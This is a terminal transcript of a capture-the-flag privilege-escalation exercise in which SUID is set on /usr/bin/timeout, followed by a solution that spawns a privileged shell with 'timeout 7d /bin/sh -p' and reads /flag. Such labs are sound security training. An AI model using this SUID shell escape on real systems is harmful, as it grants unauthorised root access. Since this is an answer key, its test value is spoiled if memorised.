hacker@babysuid_level28:~$ /challenge/babysuid_level28 
Welcome to /challenge/babysuid_level28!

This challenge is part of a series of programs that
will enable you to read flags by making them execute other commands.

I just set the SUID bit on /usr/bin/timeout.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level28) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/timeout!

//SOLUZIONE

hacker@babysuid_level28:~$ timeout 7d /bin/sh -p
# cat /flag
